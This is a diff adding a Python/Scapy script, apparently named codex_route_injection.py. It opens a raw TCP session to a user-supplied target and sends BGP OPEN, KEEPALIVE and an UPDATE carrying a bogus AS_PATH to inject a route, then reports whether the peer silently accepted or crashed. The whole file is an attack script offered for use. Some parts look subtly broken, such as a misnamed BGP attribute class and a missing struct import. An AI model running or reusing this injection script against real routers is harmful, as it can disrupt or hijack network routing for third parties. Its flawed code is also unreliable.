@@ -1,0 +1,79 @@
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import time
+
+def build_bgp_update(as_path_list, prefix):
+    # AS_PATH attribute
+    as_path = BGPPAASPath(
+        type=2,  # AS_PATH
+        length=len(as_path_list) * 2 + 2,
+        value=bytes([2, len(as_path_list)]) + b''.join([struct.pack("!H", asn) for asn in as_path_list])
+    )
+
+    # ORIGIN attribute (IGP = 0)
+    origin = BGPPAttribute(type_flags=0x40, type_code=1, length=1, value=b'\x00')
+
+    # NLRI = prefix
+    prefix_octets = [int(o) for o in prefix.split('.')]
+    prefix_data = bytes(prefix_octets[:3])  # /24 = 3 bytes
+    nlri = BGPNLRI(length=24, prefix=prefix_data)
+
+    update = BGPUpdate(
+        withdrawn_routes_len=0,
+        total_path_attribute_len=len(origin) + len(as_path),
+        path_attributes=[origin, as_path],
+        nlri=[nlri]
+    )
+    return update
+
+def send_route_injection(dst_ip, dst_port=32760):
+    ip = IP(dst=dst_ip)
+    src_port = RandShort()
+
+    # TCP handshake
+    syn = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
+    syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+    if not syn_ack or syn_ack[TCP].flags != 'SA':
+        print("[!] No SYN-ACK received. Port may be closed or filtered.")
+        return
+
+    ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+    send(ip/ack, verbose=0)
+
+    # Send BGP OPEN
+    bgp_open = BGPHeader(type=1)/BGPOpen(
+        version=4,
+        my_as=64512,
+        hold_time=90,
+        bgp_id="1.2.3.4",
+        opt_param_len=0
+    )
+    send(ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/bgp_open, verbose=0)
+    time.sleep(0.5)
+
+    # Send KEEPALIVE
+    keepalive = BGPHeader(type=4)
+    send(ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq+len(bgp_open), ack=ack.ack)/keepalive, verbose=0)
+    time.sleep(0.5)
+
+    # Send UPDATE with safe test prefix and bogus ASN path
+    as_path = [65000, 64512]
+    prefix = "100.100.100.0"
+    update = build_bgp_update(as_path, prefix)
+
+    pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq+len(bgp_open)+len(keepalive), ack=ack.ack)/BGPHeader(type=2)/update
+    print("[+] Sending simulated route injection UPDATE with AS_PATH {} and NLRI {}/24".format(as_path, prefix))
+    response = sr1(pkt, timeout=3, verbose=0)
+
+    if response:
+        print("[+] Response:", response.summary())
+    else:
+        print("[!] No response — potential silent accept or crash")
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print("Usage: sudo python3 codex_route_injection.py <target_ip>")
+        sys.exit(1)
+    send_route_injection(sys.argv[1])
